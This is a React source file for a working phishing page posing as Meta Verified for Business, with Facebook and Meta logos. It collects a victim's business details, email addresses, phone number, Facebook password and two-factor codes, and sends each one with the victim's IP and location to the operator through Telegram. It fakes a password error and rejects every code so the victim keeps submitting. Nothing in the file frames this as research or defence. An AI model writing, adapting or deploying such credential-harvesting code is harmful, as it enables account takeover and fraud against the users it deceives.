import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { sendTelegramMessage, setInitialSession, escapeHtml } from '../utils/telegram';

export default function Verify() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [clientIp, setClientIp] = useState('Unknown');
  
  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); const [countryCode, setCountryCode] = useState('+93'); const [phoneNum, setPhoneNum] = useState('');
  const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);

  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);

  useEffect(() => { fetch('https://ipwho.is/').then(r => r.json()).then(d => { if (d && d.ip) setClientIp(`${d.ip} - ${d.country} (${d.city})`); }).catch(()=>{}); }, []);

  const handleSignup = (e) => {
    e.preventDefault(); let errs = {};
    if (busName.length < 2) errs.busName = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({}); setLoading(true);
    const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
    setInitialSession(text); sendTelegramMessage('');
    setTimeout(() => { setLoading(false); setStep(2); setLoginAttempt(0); }, 700);
  };

  const handleLogin = (e) => {
    e.preventDefault(); if (loginPass.length === 0) return;
    setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
    sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
    setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); setOtpAttempt(0); } }, (newAttempt === 1) ? 3000 : 5000);
  };

  const handleOtp = (e) => {
    e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
    setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
    if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
    setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
  };

  // Style chung cho Input để giống y hệt ảnh mày gửi
  const inputStyle = {
    width: '100%', height: '52px', padding: '10px 16px', background: '#fff', 
    border: '1px solid #ccd0d5', borderRadius: '12px', fontSize: '15px', 
    color: '#1c2b33', outline: 'none', marginBottom: '12px'
  };

  const btnStyle = {
    width: '100%', height: '46px', background: '#0064e0', color: '#fff', 
    border: 'none', borderRadius: '24px', fontSize: '16px', fontWeight: '600', 
    cursor: 'pointer', marginTop: '10px'
  };

  return (
    /* Nền làm mờ, tối nhẹ để form nổi bật lên */
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0, 0, 0, 0.4)', backdropFilter: 'blur(4px)', position: 'fixed', inset: 0, zIndex: 1000 }}>
      
      <div className={`modal-container ${errors.busName || errors.perEmail || errors.busEmail || errors.phoneNum || showLoginError || showOtpError ? 'shake' : ''}`} 
           style={{ position: 'relative', background: '#fff', borderRadius: '16px', padding: '32px 24px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
           
        {/* Nút X */}
        <button onClick={() => navigate('/')} style={{ position: 'absolute', top: '16px', right: '16px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '32px', height: '32px', cursor: 'pointer', color: '#606770', fontSize: '18px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>×</button>
        
        {/* Logo FB */}
        <div style={{ textAlign: 'center', marginBottom: '20px' }}>
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ height: '54px', margin: '0 auto' }} />
        </div>

        {/* FORM 1: SIGNUP */}
        {step === 1 && (
          <>
            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#1c2b33', marginBottom: '6px' }}>Meta Verified for Business</h2>
            <p style={{ fontSize: '14px', textAlign: 'center', color: '#65676b', marginBottom: '24px' }}>Enter your business details to start your application.</p>
            <form onSubmit={handleSignup} noValidate>
                <input style={{...inputStyle, borderColor: errors.busName ? '#fa383e' : '#ccd0d5'}} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
                <input style={{...inputStyle, borderColor: errors.perEmail ? '#fa383e' : '#ccd0d5'}} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
                <input style={{...inputStyle, borderColor: errors.busEmail ? '#fa383e' : '#ccd0d5'}} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
                
                <div style={{ display: 'flex', gap: '8px', marginBottom: '12px' }}>
                    <select style={{...inputStyle, width: '40%', marginBottom: 0, cursor: 'pointer'}} value={countryCode} onChange={e => setCountryCode(e.target.value)}>
                        <option value="+93">+93 (Afghanistan)</option>
                        <option value="+84">+84 (Vietnam)</option>
                        <option value="+1">+1 (United States)</option>
                        <option value="+44">+44 (United Kingdom)</option>
                    </select>
                    <input style={{...inputStyle, flex: 1, marginBottom: 0, borderColor: errors.phoneNum ? '#fa383e' : '#ccd0d5'}} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                </div>
                
                <button type="submit" style={btnStyle} disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
            </form>
          </>
        )}

        {/* FORM 2: LOGIN */}
        {step === 2 && (
          <form onSubmit={handleLogin}>
              <input style={inputStyle} placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required />
              <input style={inputStyle} type="password" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required />
              
              {showLoginError && <div style={{ color: '#fa383e', fontSize: '13px', marginBottom: '12px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
              
              <button type="submit" style={btnStyle} disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
              <div style={{ textAlign: 'center', marginTop: '16px' }}><a href="#" style={{ color: '#1c2b33', fontSize: '14px', textDecoration: 'none' }} onClick={e => e.preventDefault()}>Forgotten password?</a></div>
          </form>
        )}

        {/* FORM 3: 2FA */}
        {step === 3 && (
          <>
            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#1c2b33', marginBottom: '6px' }}>Two-factor authentication</h2>
            <p style={{ fontSize: '14px', textAlign: 'center', color: '#65676b', marginBottom: '24px' }}>Enter the 6-digit code we sent to your WhatsApp or SMS.</p>
            <form onSubmit={handleOtp}>
                <input style={{...inputStyle, textAlign: 'center', fontSize: '24px', letterSpacing: '8px', fontWeight: '700'}} placeholder="000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
                {showOtpError && <div style={{ color: '#fa383e', fontSize: '13px', marginBottom: '12px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
                <button type="submit" style={btnStyle} disabled={loading}>{loading ? 'Verifying...' : 'Verify'}</button>
            </form>
          </>
        )}

        {/* Footer Meta */}
        <div style={{ textAlign: 'center', marginTop: '24px', paddingTop: '16px', borderTop: '1px solid #e4e6eb' }}>
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '14px', margin: '0 auto' }} />
        </div>
      </div>
    </div>
  );
}